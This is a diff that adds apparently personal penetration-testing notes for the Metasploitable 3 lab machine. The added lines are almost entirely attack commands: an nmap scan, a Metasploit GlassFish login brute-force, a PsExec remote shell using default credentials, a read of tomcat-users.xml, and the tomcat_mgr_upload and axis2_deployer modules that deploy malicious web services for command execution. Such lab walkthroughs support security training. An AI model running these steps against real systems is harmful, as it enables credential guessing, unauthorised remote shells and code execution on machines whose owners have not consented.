@@ -95,10 +95,58 @@ msf exploit(mysql_payload) > set rport 3306
 msf exploit(mysql_payload) > exploit
 ---------------------------------------------------------------------------------
 
+Glassfish Service
 
+nmap –p- -A 192.168.1.14
 
+msf > use auxiliary/scanner/http/glassfish_login
 
+msf auxiliary(glassfish_login) > set rhosts 192.168.1.14
 
+msf auxiliary(glassfish_login) > set rport 4848
+
+msf auxiliary(glassfish_login) > set STOP_ON_SUCCESS true
+
+msf auxiliary(glassfish_login) > set  user_file /root/Desktop/user.txt
+
+msf auxiliary(glassfish_login) > set  pass_file /root/Desktop/pass.txt
+
+msf auxiliary(glassfish_login) >exploit
+
+#  After few attempt successfully we have our login for GLASSFISH as admin: sploit
+---------------------------------------------------------------------------------------
+SMB and Tomcat
+nmap –p- -A 192.168.1.14
+
+http://download.sysinternals.com/files/PSTools.zip.
+PsExec.exe \\192.168.1.14 -u vagrant -p vagrant cmd
+
+Type tomcat-users.xml
+
+msf > use exploit/multi/http/tomcat_mgr_upload
+
+msf exploit(tomcat_mgr_upload) > set rhost 192.168.1.14
+
+msf exploit(tomcat_mgr_upload) > set rport 8282
+
+msf exploit(tomcat_mgr_upload) > set HttpUsername sploit
+
+msf exploit(tomcat_mgr_upload) > set HttpPassword sploit
+
+msf exploit(tomcat_mgr_upload) > exploit
+----------------------------------------------------------------
+Another way to exploit your target
+This module logs in to an Axis2 Web Admin Module instance using a specific user/pass and uploads and executes commands via deploying a malicious web service by using SOAP.
+
+msf > use exploit/multi/http/axis2_deployer
+
+msf exploit(axis2_deployer) > set rhost 192.168.1.8
+
+msf exploit(axis2_deployer) > set rport 8282
+
+msf exploit(axis2_deployer) >exploit
+
+-------------------------------------------------------------------
 
 
 
@@ -134,3 +182,6 @@ msf exploit(mysql_payload) > exploit
  DOS Attack:
 https://www.hackingarticles.in/perform-dos-attack-metasploitable-3/
 nmap -p-  -A 192.168.1.14
+-------------------------------------------------------------------------
+Manual Penetration Testing in Metasploitable 3
+https://www.hackingarticles.in/manual-penetration-testing-metasploitable-3/
